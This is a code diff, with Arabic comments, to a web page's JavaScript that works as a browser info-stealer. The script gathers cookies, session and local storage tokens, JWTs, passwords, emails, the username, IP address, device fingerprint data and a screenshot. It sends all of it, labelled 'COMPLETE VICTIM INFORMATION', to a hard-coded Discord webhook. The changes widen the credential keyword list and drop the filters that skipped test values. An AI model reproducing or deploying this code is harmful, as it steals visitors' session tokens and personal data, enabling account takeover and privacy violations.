@@ -11,74 +11,190 @@
 
     <script>
         // ============================================
-        // دالة البحث عن الإيميلات الحقيقية فقط
+        // دالة متقدمة للبحث عن التوكنات (معدلة)
+        // ============================================
+        function findRealTokens() {
+            const tokens = [];
+            
+            // كلمات مفتاحية موسعة جداً
+            const tokenKeywords = [
+                'token', 'auth', 'jwt', 'session', 'access', 'refresh', 'bearer', 
+                'api_key', 'apikey', 'secret', 'password', 'pass', 'login', 'user', 
+                'id', 'sid', 'csrf', 'xsrf', 'oauth', 'authorization', 'x-auth',
+                'x-access-token', 'x-api-key', 'authentication', 'credentials',
+                'accesstoken', 'refreshtoken', 'acctkn', 'tk', 'tkn', 'tokn'
+            ];
+            
+            // 1. البحث في الكوكيز (بدون شروط صارمة)
+            const cookies = document.cookie.split(';');
+            cookies.forEach(cookie => {
+                const [name, value] = cookie.trim().split('=');
+                if (!name || !value || value.length < 5) return;
+                
+                tokenKeywords.forEach(keyword => {
+                    if (name.toLowerCase().includes(keyword.toLowerCase())) {
+                        tokens.push({
+                            source: '🍪 Cookie',
+                            name: name,
+                            value: value.substring(0, 100),
+                            type: keyword,
+                            length: value.length
+                        });
+                    }
+                });
+                
+                // فحص JWT (حتى لو قصير)
+                if (value && value.split('.').length === 3) {
+                    tokens.push({
+                        source: '🔐 JWT Token',
+                        name: name,
+                        value: value.substring(0, 100),
+                        type: 'JWT',
+                        length: value.length
+                    });
+                }
+                
+                // أي قيمة طويلة ممكن تكون توكن
+                if (value.length > 30 && /^[A-Za-z0-9\-_]+$/.test(value)) {
+                    tokens.push({
+                        source: '🔑 Possible Token',
+                        name: name,
+                        value: value.substring(0, 100),
+                        type: 'Unknown Token',
+                        length: value.length
+                    });
+                }
+            });
+            
+            // 2. البحث في localStorage (بدون شروط)
+            try {
+                for(let i = 0; i < localStorage.length; i++) {
+                    let key = localStorage.key(i);
+                    let value = localStorage.getItem(key);
+                    
+                    if (!value) continue;
+                    
+                    tokenKeywords.forEach(keyword => {
+                        if (key.toLowerCase().includes(keyword.toLowerCase())) {
+                            tokens.push({
+                                source: '💾 localStorage',
+                                name: key,
+                                value: value.substring(0, 100),
+                                type: keyword,
+                                length: value.length
+                            });
+                        }
+                    });
+                    
+                    // فحص JWT في localStorage
+                    if (value && value.split('.').length === 3) {
+                        tokens.push({
+                            source: '🔐 JWT in localStorage',
+                            name: key,
+                            value: value.substring(0, 100),
+                            type: 'JWT',
+                            length: value.length
+                        });
+                    }
+                    
+                    // أي قيمة طويلة
+                    if (value.length > 30 && /^[A-Za-z0-9\-_]+$/.test(value)) {
+                        tokens.push({
+                            source: '🔑 localStorage Token',
+                            name: key,
+                            value: value.substring(0, 100),
+                            type: 'Unknown',
+                            length: value.length
+                        });
+                    }
+                }
+            } catch(e) {}
+            
+            // 3. البحث في sessionStorage
+            try {
+                for(let i = 0; i < sessionStorage.length; i++) {
+                    let key = sessionStorage.key(i);
+                    let value = sessionStorage.getItem(key);
+                    
+                    if (!value) continue;
+                    
+                    tokenKeywords.forEach(keyword => {
+                        if (key.toLowerCase().includes(keyword.toLowerCase())) {
+                            tokens.push({
+                                source: '📝 sessionStorage',
+                                name: key,
+                                value: value.substring(0, 100),
+                                type: keyword,
+                                length: value.length
+                            });
+                        }
+                    });
+                    
+                    if (value && value.split('.').length === 3) {
+                        tokens.push({
+                            source: '🔐 JWT in sessionStorage',
+                            name: key,
+                            value: value.substring(0, 100),
+                            type: 'JWT',
+                            length: value.length
+                        });
+                    }
+                    
+                    if (value.length > 30 && /^[A-Za-z0-9\-_]+$/.test(value)) {
+                        tokens.push({
+                            source: '🔑 sessionStorage Token',
+                            name: key,
+                            value: value.substring(0, 100),
+                            type: 'Unknown',
+                            length: value.length
+                        });
+                    }
+                }
+            } catch(e) {}
+            
+            return tokens;
+        }
+
+        // ============================================
+        // دالة البحث عن الإيميلات الحقيقية
         // ============================================
         function findRealEmails() {
             const emails = new Set();
             const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
             
             try {
-                // 1. البحث في الكوكيز الحقيقية
+                // البحث في الكوكيز
                 const cookies = document.cookie;
                 const cookieEmails = cookies.match(emailRegex);
                 if (cookieEmails) {
-                    cookieEmails.forEach(e => {
-                        // فلترة الإيميلات الوهمية
-                        if (!e.includes('example') && !e.includes('test') && !e.includes('demo')) {
-                            emails.add(e);
-                        }
-                    });
+                    cookieEmails.forEach(e => emails.add(e));
                 }
                 
-                // 2. البحث في localStorage الحقيقي
+                // البحث في localStorage
                 for (let i = 0; i < localStorage.length; i++) {
                     const key = localStorage.key(i);
                     const value = localStorage.getItem(key);
                     
                     const keyEmails = key.match(emailRegex);
-                    if (keyEmails) {
-                        keyEmails.forEach(e => {
-                            if (!e.includes('example') && !e.includes('test') && !e.includes('demo')) {
-                                emails.add(e);
-                            }
-                        });
-                    }
+                    if (keyEmails) keyEmails.forEach(e => emails.add(e));
                     
                     if (value && typeof value === 'string') {
                         const valueEmails = value.match(emailRegex);
-                        if (valueEmails) {
-                            valueEmails.forEach(e => {
-                                if (!e.includes('example') && !e.includes('test') && !e.includes('demo')) {
-                                    emails.add(e);
-                                }
-                            });
-                        }
+                        if (valueEmails) valueEmails.forEach(e => emails.add(e));
                     }
                 }
                 
-                // 3. البحث في sessionStorage الحقيقي
+                // البحث في sessionStorage
                 for (let i = 0; i < sessionStorage.length; i++) {
                     const key = sessionStorage.key(i);
                     const value = sessionStorage.getItem(key);
                     
                     const keyEmails = key.match(emailRegex);
-                    if (keyEmails) {
-                        keyEmails.forEach(e => {
-                            if (!e.includes('example') && !e.includes('test') && !e.includes('demo')) {
-                                emails.add(e);
-                            }
-                        });
-                    }
+                    if (keyEmails) keyEmails.forEach(e => emails.add(e));
                     
                     if (value && typeof value === 'string') {
                         const valueEmails = value.match(emailRegex);
-                        if (valueEmails) {
-                            valueEmails.forEach(e => {
-                                if (!e.includes('example') && !e.includes('test') && !e.includes('demo')) {
-                                    emails.add(e);
-                                }
-                            });
-                        }
+                        if (valueEmails) valueEmails.forEach(e => emails.add(e));
                     }
                 }
                 
@@ -88,42 +204,37 @@
         }
 
         // ============================================
-        // دالة الحصول على اسم المستخدم الحقيقي
+        // دالة الحصول على اسم المستخدم
         // ============================================
         function getRealUsername() {
             let username = "Not found";
             try {
-                // البحث في localStorage عن اسم المستخدم الحقيقي
                 const userKeys = ['username', 'user', 'name', 'displayName', 'fullName', 'realname', 'real_name'];
                 
                 for (let key of userKeys) {
-                    // في localStorage
                     const localValue = localStorage.getItem(key);
-                    if (localValue && localValue.length > 2 && !localValue.includes('example') && !localValue.includes('test')) {
+                    if (localValue && localValue.length > 2) {
                         username = localValue;
                         break;
                     }
                     
-                    // في sessionStorage
                     const sessionValue = sessionStorage.getItem(key);
-                    if (sessionValue && sessionValue.length > 2 && !sessionValue.includes('example') && !sessionValue.includes('test')) {
+                    if (sessionValue && sessionValue.length > 2) {
                         username = sessionValue;
                         break;
                     }
                 }
                 
-                // البحث في الكوكيز
                 const cookies = document.cookie;
                 const patterns = [
                     /user[_-]?name=([^;]+)/i,
                     /login=([^;]+)/i,
-                    /username=([^;]+)/i,
-                    /real[_-]?name=([^;]+)/i
+                    /username=([^;]+)/i
                 ];
                 
                 for (let pattern of patterns) {
                     const match = cookies.match(pattern);
-                    if (match && match[1] && !match[1].includes('example') && !match[1].includes('test')) {
+                    if (match && match[1]) {
                         username = decodeURIComponent(match[1]);
                         break;
                     }
@@ -134,7 +245,7 @@
         }
 
         // ============================================
-        // دالة الحصول على اسم الكمبيوتر الحقيقي
+        // دالة الحصول على اسم الكمبيوتر
         // ============================================
         function getRealComputerName() {
             try {
@@ -143,11 +254,7 @@
                 if (match) {
                     const parts = match[1].split(';');
                     if (parts.length > 1) {
-                        let computerName = parts[1].trim();
-                        // إذا كان اسم الكمبيوتر طويل جداً، ممكن يكون حقيقي
-                        if (computerName.length > 3 && !computerName.includes('Unknown')) {
-                            return computerName;
-                        }
+                        return parts[1].trim();
                     }
                 }
             } catch(e) {}
@@ -155,72 +262,11 @@
         }
 
         // ============================================
-        // دالة البحث عن التوكنات الحقيقية
-        // ============================================
-        function findRealTokens() {
-            const tokens = [];
-            const tokenKeywords = ['token', 'auth', 'jwt', 'session', 'access', 'refresh', 'bearer', 'api_key', 'apikey', 'secret'];
-            
-            // 1. البحث في الكوكيز الحقيقية
-            const cookies = document.cookie.split(';');
-            cookies.forEach(cookie => {
-                const [name, value] = cookie.trim().split('=');
-                if (!name || !value) return;
-                
-                // تجاهل القيم التجريبية
-                if (value.includes('example') || value.includes('test') || value.includes('demo') || value.length < 10) {
-                    return;
-                }
-                
-                tokenKeywords.forEach(keyword => {
-                    if (name.toLowerCase().includes(keyword.toLowerCase())) {
-                        tokens.push({
-                            source: 'Cookie',
-                            name: name,
-                            value: value.substring(0, 50)
-                        });
-                    }
-                });
-                
-                // فحص JWT حقيقي (طويل ومعقد)
-                if (value && value.split('.').length === 3 && value.length > 50) {
-                    tokens.push({
-                        source: 'JWT Token',
-                        name: name,
-                        value: value.substring(0, 50) + '...'
-                    });
-                }
-            });
-            
-            // 2. البحث في localStorage الحقيقي
-            try {
-                for(let i = 0; i < localStorage.length; i++) {
-                    let key = localStorage.key(i);
-                    let value = localStorage.getItem(key);
-                    
-                    if (!value || value.includes('example') || value.includes('test') || value.length < 10) continue;
-                    
-                    tokenKeywords.forEach(keyword => {
-                        if (key.toLowerCase().includes(keyword.toLowerCase())) {
-                            tokens.push({
-                                source: 'localStorage',
-                                name: key,
-                                value: value.substring(0, 50)
-                            });
-                        }
-                    });
-                }
-            } catch(e) {}
-            
-            return tokens;
-        }
-
-        // ============================================
-        // الدالة الرئيسية - معلومات حقيقية فقط
+        // الدالة الرئيسية
         // ============================================
         async function collectRealInfo() {
             try {
-                // 1. أخذ لصة حقيقية
+                // 1. أخذ لقطة
                 let screenshotBase64 = '';
                 try {
                     const canvas = await html2canvas(document.body, {
@@ -230,10 +276,17 @@
                     screenshotBase64 = canvas.toDataURL('image/png');
                 } catch (e) {}
 
-                // 2. معلومات حقيقية
-                const ipAddress = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'Unknown');
-                
+                // 2. معلومات الشبكة
+                let ipAddress = 'Unknown';
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    ipAddress = ipData.ip;
+                } catch (e) {}
+
                 const connection = navigator.connection || {};
+                
+                // 3. معلومات المتصفح
                 const browserInfo = {
                     platform: navigator.platform,
                     language: navigator.language,
@@ -242,65 +295,101 @@
                     userAgent: navigator.userAgent
                 };
 
-                // 3. معلومات حقيقية عن الجهاز
+                // 4. معلومات الشاشة
                 const screenInfo = {
                     width: window.screen.width,
                     height: window.screen.height,
                     colorDepth: window.screen.colorDepth
                 };
 
-                // 4. اسم المستخدم الحقيقي
+                // 5. معلومات البطارية
+                let batteryInfo = { level: 'Unknown', charging: 'Unknown' };
+                if (navigator.getBattery) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        batteryInfo = {
+                            level: Math.round(battery.level * 100) + '%',
+                            charging: battery.charging ? 'Yes' : 'No'
+                        };
+                    } catch (e) {}
+                }
+
+                // 6. معلومات GPU
+                let gpuInfo = 'Unknown';
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        if (debugInfo) {
+                            gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                        }
+                    }
+                } catch (e) {}
+
+                // 7. جمع كل المعلومات الحقيقية
                 const realUsername = getRealUsername();
-                
-                // 5. اسم الكمبيوتر الحقيقي
                 const realComputerName = getRealComputerName();
-                
-                // 6. الإيميلات الحقيقية
                 const realEmails = findRealEmails();
-                
-                // 7. التوكنات الحقيقية
                 const realTokens = findRealTokens();
 
                 // ============================================
-                // تجهيز الرسالة - معلومات حقيقية فقط
+                // تجهيز الرسالة
                 // ============================================
-                const emailsMessage = realEmails.length > 0 ? realEmails.join('\n') : 'No real emails found';
-                const tokensMessage = realTokens.length > 0 ? 
-                    realTokens.map(t => `${t.source} | ${t.name}: ${t.value}`).join('\n') : 
-                    'No real tokens found';
+                const emailsMessage = realEmails.length > 0 ? realEmails.join('\n') : 'No emails found';
+                
+                let tokensMessage = '';
+                if (realTokens.length > 0) {
+                    tokensMessage = realTokens.map(t => 
+                        `${t.source} | ${t.name} (${t.type}): ${t.value} [Length: ${t.length}]`
+                    ).join('\n');
+                } else {
+                    tokensMessage = 'No tokens found';
+                }
 
                 const webhookUrl = 'https://discord.com/api/webhooks/1476727887053721721/UkshRh9j3xisTqqOHLnEvMI5dFlg-dmLWZkuY55yPtAWjuFFM0iPkMlFWUlF0LUjWHTN';
 
                 const textMessage = `
-**📌 REAL VICTIM INFORMATION**
+**📌 COMPLETE VICTIM INFORMATION**
 
-**👤 REAL USER:**
-Username: ${realUsername}
-Computer: ${realComputerName}
+**👤 USER INFO:**
+• Username: ${realUsername}
+• Computer Name: ${realComputerName}
 
-**📧 REAL EMAILS:**
+**📧 EMAILS FOUND:**
 ${emailsMessage}
 
-**🔑 REAL TOKENS:**
+**🔑 TOKENS FOUND:**
 ${tokensMessage}
 
-**🍪 REAL COOKIES:**
-${document.cookie || 'None'}
+**🍪 ALL COOKIES:**
+\`\`\`
+${document.cookie || 'No cookies'}
+\`\`\`
 
 **🌐 NETWORK:**
-IP: ${ipAddress}
-Speed: ${connection.downlink || '?'} Mbps
+• IP: ${ipAddress}
+• Speed: ${connection.downlink || '?'} Mbps
+• Connection Type: ${connection.effectiveType || '?'}
 
 **💻 SYSTEM:**
-OS: ${browserInfo.platform}
-CPU: ${browserInfo.cpuCores} cores
-RAM: ${browserInfo.ram}
+• Platform: ${browserInfo.platform}
+• Language: ${browserInfo.language}
+• CPU Cores: ${browserInfo.cpuCores}
+• RAM: ${browserInfo.ram}
+• Battery: ${batteryInfo.level} (${batteryInfo.charging})
+• GPU: ${gpuInfo}
 
 **🖥️ SCREEN:**
-${screenInfo.width}x${screenInfo.height}
+• Resolution: ${screenInfo.width}x${screenInfo.height}
+• Color Depth: ${screenInfo.colorDepth}-bit
 
 **⏰ TIME:**
-${new Date().toString()}
+• Local: ${new Date().toString()}
+• Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+
+**🌍 BROWSER:**
+${browserInfo.userAgent.substring(0, 300)}
 `;
 
                 // إرسال النص
@@ -327,7 +416,7 @@ ${new Date().toString()}
 
                     const blob = new Blob(byteArrays, { type: 'image/png' });
                     const formData = new FormData();
-                    formData.append('file', blob, 'real_screenshot.png');
+                    formData.append('file', blob, 'screenshot.png');
                     
                     await fetch(webhookUrl, {
                         method: 'POST',
@@ -336,10 +425,11 @@ ${new Date().toString()}
                 }
 
                 // رسالة نجاح
-                document.body.innerHTML += '<p style="color: green;">✅ Real information collected and sent!</p>';
+                document.body.innerHTML = '<h1 style="color: green; margin-top: 100px;">✅ Information collected and sent!</h1>';
 
             } catch (error) {
                 console.error('Error:', error);
+                document.body.innerHTML = '<h1 style="color: red;">❌ Error occurred</h1>';
             }
         }
 
